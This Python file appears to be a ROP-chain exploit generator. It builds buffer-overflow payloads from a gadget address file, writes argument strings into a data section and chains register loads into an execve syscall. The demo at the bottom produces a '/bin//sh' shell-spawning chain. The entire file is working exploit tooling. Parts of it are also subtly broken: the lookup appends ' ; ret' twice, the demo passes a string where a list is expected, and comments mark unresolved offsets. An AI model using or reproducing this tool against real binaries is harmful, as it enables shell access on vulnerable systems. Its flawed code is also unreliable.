from struct import pack
from ReverseExecution import generalToBytes

NULL = b'\0\0\0\0'

WORD_LEN = 4
gadgetdictionary = {
    "NULL" : 0x0
}

DATA_ADDRESS = 0x080da060

A_REGISTER = "eax"
ARG_START_REGISTER = "ebx"
ARG_END_REGISTER = "ecx"
STACK_BUILD_REGISTER = "edx"

EXECVE_VALUE = 11
SYSCALL = "int 0x80"
WORD_TYPE = "dword"
PACK_TYPE = "<I"


def LoadGadgetDictionary(filename, dictionary):
    file = open(filename, "r")
    for line in file:
        vals = line.split(':')
        if len(vals) == 2:
            memoryLocation = vals[0].rstrip()
            gadget = vals[1].lstrip().rstrip('\n')
            dictionary.update({gadget : memoryLocation})

def InitValues(bits):
    if bits == 32:
       print("Loading 32bit Mode...")
       return 4,  0x080da060, "eax", "ebx", "ecx", "edx", 11, "int 0x80", "dword", "<I"
    if bits == 64:
        print("Loading 64bit Mode...")
        return 8,  0x00000000006b90e0, "rax", "rbx", "rdi", "rsi", 59, "syscall", "qword", "<Q"
    print("Unknown Bit Number")
    quit()

def CreateROPChain(command, bufflength, gadgetfile, bits):
    global WORD_LEN, DATA_ADDRESS, A_REGISTER, ARG_START_REGISTER, ARG_END_REGISTER, STACK_BUILD_REGISTER, EXECVE_VALUE, SYSCALL, WORD_TYPE, PACK_TYPE
    
    LoadGadgetDictionary(gadgetfile, gadgetdictionary)
    WORD_LEN, DATA_ADDRESS, A_REGISTER, ARG_START_REGISTER, ARG_END_REGISTER, STACK_BUILD_REGISTER, EXECVE_VALUE, SYSCALL, WORD_TYPE, PACK_TYPE = InitValues(bits)

    if command[0:6] == "execve":
        return execve([eval(x.strip()) for x in command[7:-1].split(',')], bufflength)
    return None

def SplitListOnData(Gadgets):
    datavaluelocations = [idx + 1 for idx, val in enumerate(Gadgets) if type(val) is bytes]
    sections = [Gadgets[i:j] for i, j in zip([0] + datavaluelocations, datavaluelocations + ([len(Gadgets)] if datavaluelocations[-1] != len(Gadgets) else []))]
    return sections

def dataaddressToValue(instruction):
    return int(instruction.lstrip("@ .dat+") or 0)

def ReplaceMissingGadget(gadget):
    return None

def WriteAsChain(Gadgets, bufflength):
    chain = b'A' * bufflength

    sections = SplitListOnData(Gadgets)
    print(sections)
    for section in sections:
        sectionender = section.pop()
        if sectionender == SYSCALL:
            sectionender = pack(PACK_TYPE, A2R(SYSCALL))

        count = len(section)
        idx = 0
        while idx < len(section) and count > 0:
            if count == 0:
                print("missing gadget : <" + str(section[idx]) + ">")
                print("attempting to recover...")
                chain += ReplaceMissingGadget(section[idx])
                idx += 1
                count = len(section) - idx

            if type(section[idx]) is int:
                chain += pack(PACK_TYPE, section[idx])
                print("adding address : <" + str(section[idx]) + ">")
                idx += 1
                count = len(section) - idx

            g = " ; ".join([str(x) for x in section[idx:idx+count]]) + " ; ret"
            if g + " ; ret" in gadgetdictionary:
                chain += pack(PACK_TYPE, A2R(g + " ; ret"))
                print("adding gadget  : <" + g + " ; ret>")
                idx += count
                count = len(section) - idx
                continue

            count -= 1
        chain += sectionender  
        print("adding bytes   : <" + str(sectionender) + ">")

    return chain

def execve(arguments, bufflength):
    #add buffer string
    payload = []

    #set up data
    print(arguments)
    endoffset = 0
    for arg in arguments:
        argbytes, offset = AddArgument(arg)
        payload.extend(argbytes)
        endoffset += offset
    print(endoffset)
    
    #Write NULL dword
    payload.append("pop " + STACK_BUILD_REGISTER)
    payload.append(DATA_ADDRESS + 8) # 8 or endoffset?
    payload.append("xor "+A_REGISTER+", "+A_REGISTER) # set eax to 0
    payload.append("mov "+WORD_TYPE+" ptr ["+STACK_BUILD_REGISTER+"], "+A_REGISTER) # move eax into location at edx

    #load arguments to registers? (needs a 32bit and 64bit version)
    if WORD_LEN == 4:
        payload.append("pop ebx") #pop ebx 
        payload.append(DATA_ADDRESS) #put data address in ebx
        payload.append("pop ecx ; pop ebx") #pop ecx and ebx
        payload.append(DATA_ADDRESS + 8) #put end of data into ecx (8 or endoffset?)
        payload.append(DATA_ADDRESS) #put start of data in ebx?
        payload.append("pop edx") #pop edx
        payload.append(DATA_ADDRESS + 8) #put end of data into edx? (8 or endoffset?)

    if WORD_LEN == 8:
        payload.append("pop rdi")
        payload.append(DATA_ADDRESS)
        payload.append("pop rsi")
        payload.append(DATA_ADDRESS + 8)
        payload.append("pop rdx")
        payload.append(DATA_ADDRESS + 8)

    #set eax to execve
    payload.extend(SetAReg(EXECVE_VALUE))

    #syscall
    payload.append(SYSCALL)

    return WriteAsChain(payload, bufflength)

def AddArgument(argument):
    numwords = int(len(argument) / WORD_LEN) #assumes word alignment of arguments
    arg = ""
    if type(argument) is str:
        arg = argument
    if type(argument) is bytes:
        arg = argument
    s = []
    for i in range(numwords):
        s.append("pop "+STACK_BUILD_REGISTER)
        s.append(DATA_ADDRESS + (i * WORD_LEN))
        s.append("pop "+A_REGISTER)
        s.append(arg[i*WORD_LEN:(i+1)*WORD_LEN].encode("utf-8"))
        s.append("mov "+WORD_TYPE+" ptr ["+STACK_BUILD_REGISTER+"], "+A_REGISTER)
    return s, numwords * WORD_LEN

def SetAReg(value):
    s = ["xor "+A_REGISTER+", "+A_REGISTER]
    for i in range(value):
        if WORD_LEN == 4:
            s.append("inc eax")
        if WORD_LEN == 8:
            s.append("add rax, 1")
    return s

def A2R(instruction):
    #Assembly to ROP
    if type(instruction) is int:
        return instruction
    if type(instruction) is bytes:
        return int.from_bytes(instruction, byteorder='little')
    return int(gadgetdictionary[instruction], 0)

def AssemblyToGadget(instruction):
    #Assembly string to Gadget Address
    if type(instruction) is bytes:
        return int.from_bytes(instruction, byteorder='little')
    if type(instruction) is int:
        return instruction
    if instruction[0] == '@':
        return dataaddressToValue(instruction)
    return int(gadgetdictionary[instruction],0)

def AssemblyListToGadgets(instructions, bufflength, dictionary):
    #Assumes guarantee that all instructions appear in dictionary
    chain = b'A' * bufflength

    for instruction in instructions:
        if type(instruction) is bytes:
            chain += instruction
            print("adding bytes   : <" + str(instruction) + ">")
            continue

        if instruction == SYSCALL:
            chain += pack(PACK_TYPE, int(dictionary[SYSCALL],0))
            print("adding syscall")
            break

        if type(instruction) is int:
            chain += pack(PACK_TYPE, instruction)
            print("adding address : <" + str(instruction) + ">")
            continue

        if instruction[0] == '@':
            chain += generalToBytes(dataaddressToValue(instruction) + DATA_ADDRESS)
            print("adding address : <" + str(instruction) + ">")
            continue

        if instruction not in dictionary:
            print("missing gadget : <" + str(instruction) + ">")
            continue
        
        if instruction in dictionary:
            chain += pack(PACK_TYPE, int(dictionary[instruction],0))
            print("adding gadget  : <" + instruction + ">")
            continue 

    return chain

if __name__ == "__main__":
    dummydict = {
        "xor eax, eax" : 0x42424242,
        "inc eax" : 0x43434343,
        "int 0x80" : 0x44444444,
        "pop eax" : 0x45454545,
        "pop ebx" : 0x46464646,
        "pop ecx" : 0x47474747,
        "pop edx" : 0x48484848,
        "@ .data" : 0x49494949,
        "mov dword ptr [edx], eax" : 0x48484848,
    }
    gadgetdictionary.update(dummydict)
    print(execve("/bin//sh", 44))
